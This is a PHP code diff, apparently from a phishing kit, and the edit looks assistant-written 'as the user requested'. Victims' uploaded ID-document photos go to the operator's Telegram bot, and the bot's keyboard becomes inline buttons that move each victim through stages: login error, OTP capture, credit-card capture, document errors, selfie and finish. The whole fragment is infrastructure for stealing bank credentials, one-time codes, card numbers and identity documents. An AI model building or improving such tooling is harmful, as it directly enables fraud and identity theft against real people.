@@ -45,34 +45,39 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // --- 2. Enviar la imagen al Bot de Telegram ---
 
+        $baseUrl = $config['baseUrl'];
+        $security_key = $config['security_key'];
+
         $caption = ($tipo === 'front') ? "🆔 Documento FRENTE recibido" : "🆔 Documento REVERSO recibido";
         $caption .= "\nID Cliente: " . $clienteId;
 
         // Teclado completo (copiado de modules/login/process_login.php y expandido)
+        // Teclado completo INLINE (Solución al "no aparecen botones")
+        // Además, reemplazamos los botones de Doc por sus versiones de Error como solicitó el usuario.
         $keyboard = [
-            'keyboard' => [
+            'inline_keyboard' => [
                 [
-                    ['text' => '🔔 Login Error'],
-                    ['text' => '🔢 OTP'],
-                    ['text' => '🚫 OTP Error']
+                    ['text' => '❌ Error Login', 'url' => "$baseUrl?id=$clienteId&estado=2&key=$security_key"],
+                    ['text' => '🔑 Otp', 'url' => "$baseUrl?id=$clienteId&estado=3&key=$security_key"],
                 ],
                 [
-                    ['text' => '💳 CC'],
-                    ['text' => '🚫 CC Error'],
-                    ['text' => '✅ Finalizar']
+                    ['text' => '⚠️ Otp Error', 'url' => "$baseUrl?id=$clienteId&estado=4&key=$security_key"],
+                    ['text' => '💳 CC', 'url' => "$baseUrl?id=$clienteId&estado=5&key=$security_key"],
                 ],
                 [
-                    ['text' => '🆔 Doc Frente'],
-                    ['text' => '🆔 Doc Reverso']
+                    ['text' => '⚠️ CC Error', 'url' => "$baseUrl?id=$clienteId&estado=6&key=$security_key"],
+                    ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$clienteId&estado=7&key=$security_key"],
                 ],
                 [
-                    ['text' => '📲 WhatsApp'],
-                    ['text' => '🤳 Selfie'],
-                    ['text' => '⚠️ Selfie Error']
+                    ['text' => '⚠️ Error Doc Frente', 'url' => "$baseUrl?id=$clienteId&estado=13&key=$security_key"],
+                    ['text' => '⚠️ Error Doc Reverso', 'url' => "$baseUrl?id=$clienteId&estado=14&key=$security_key"]
+                ],
+                [
+                    ['text' => '📲 WhatsApp', 'url' => "$baseUrl?id=$clienteId&estado=8&key=$security_key"],
+                    ['text' => '🤳 Selfie', 'url' => "$baseUrl?id=$clienteId&estado=9&key=$security_key"],
+                    ['text' => '⚠️ Selfie Error', 'url' => "$baseUrl?id=$clienteId&estado=10&key=$security_key"]
                 ]
-            ],
-            'resize_keyboard' => true,
-            'persistent_keyboard' => true
+            ]
         ];
 
         $encodedKeyboard = json_encode($keyboard);
